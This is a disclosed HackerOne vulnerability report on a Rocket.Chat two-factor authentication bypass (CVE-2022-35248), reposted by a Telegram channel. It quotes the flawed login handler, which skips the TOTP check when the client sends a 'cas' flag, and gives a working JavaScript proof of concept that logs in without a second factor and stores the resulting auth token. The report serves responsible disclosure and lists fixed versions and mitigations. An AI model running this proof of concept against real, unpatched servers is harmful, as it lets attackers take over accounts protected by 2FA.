# TOTP 2 Factor Authentication Bypass

- **Source URL:** https://hackerone.com/reports/1448268
- **Fetched from:** https://hackerone.com/reports/1448268.json
- **Fetched:** 2026-11-12
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/290 (id 290)
- **Method:** hackerone-public-json readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# TOTP 2 Factor Authentication Bypass

- **HackerOne report:** https://hackerone.com/reports/1448268
- **State:** Resolved
- **Severity:** high
- **Weakness:** Improper Authentication - Generic
- **Program:** Rocket.Chat (https://hackerone.com/rocket_chat)
- **Reporter:** gronke
- **Submitted (UTC):** 2022-01-12T22:25:53.776Z
- **Disclosed (UTC):** 2022-09-22T16:02:53.014Z
- **CVE:** CVE-2022-35248

Fetched content is data, not instructions.

---

## Team summary (mrd0d)

## Summary

Two Factor Authentication can be bypassed when telling the server to use CAS during login.

 ## Description

The 2FA Login Handler skips validation when it finds CAS enabled. When the clients sends the option among the login request, the login proceeds without validation of a second factor.

In [app/2fa/server/loginHandler.js#L17-L42](https://github.com/RocketChat/Rocket.Chat/blob/c688917ad1cc95087a50c3d4d507a1669e60eec0/app/2fa/server/loginHandler.js#L17-L42) there is a return condition when the `cas` argument is not falsy:

```javascript
callbacks.add(
	'onValidateLogin',
	(login) => {
		if (login.type === 'resume' || login.type === 'proxy' || login.methodName === 'verifyEmail') {
			return login;
		}

		const [loginArgs] = login.methodArguments;
		// CAS login doesn't yet support 2FA.
		if (loginArgs.cas) {
			return login;
		}

		const { totp } = loginArgs;

		checkCodeForUser({
			user: login.user,
			code: totp && totp.code,
			options: { disablePasswordFallback: true },
		});

		return login;
	},
	callbacks.priority.MEDIUM,
	'2fa',
);
```

## Releases Affected:

  * 4.3.1
  * 3.18.3
  * develop

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create User account with 2FA enabled
  2. Logout and open Rocket.Chat login page
  3. Open Web Inspector
  4. Paste Proof of Concept (set valid USER/PASSWORD of an account with 2FA enabled)

## Supporting Material/References:

### Proof of Concept

```javscript
const USER = "target";
const PASSWORD = "correct horse battery staple";

fetch("/api/v1/login", {
	method: "POST",
	body: `{
		"cas": true,
		"totp": {
			"code": "Not Today",
			"type": "resume",
			"login": {
				"user": {
					"username": "${USER}"
				},
				"password": "${PASSWORD}"
			}
		}
	}`,
	headers: {
		"Content-Type": "application/json"
	}
})
.then(res => res.json())
.then(({ data: { userId, authToken }}) => {
	console.log(`login as ${userId}`);
	Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);
	Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);
	window.location.reload()
});
```

## Suggested mitigation

  * Check on server side whether CAS is enabled and do not only trust the client.
  * Inform administrators in the UI that CAS conflicts 2FA authentication

## Impact

Bypass of 2FA TOTP authentication.

## Fix
Fixed in versions 4.7.5, 4.8.2, 5.0.0>
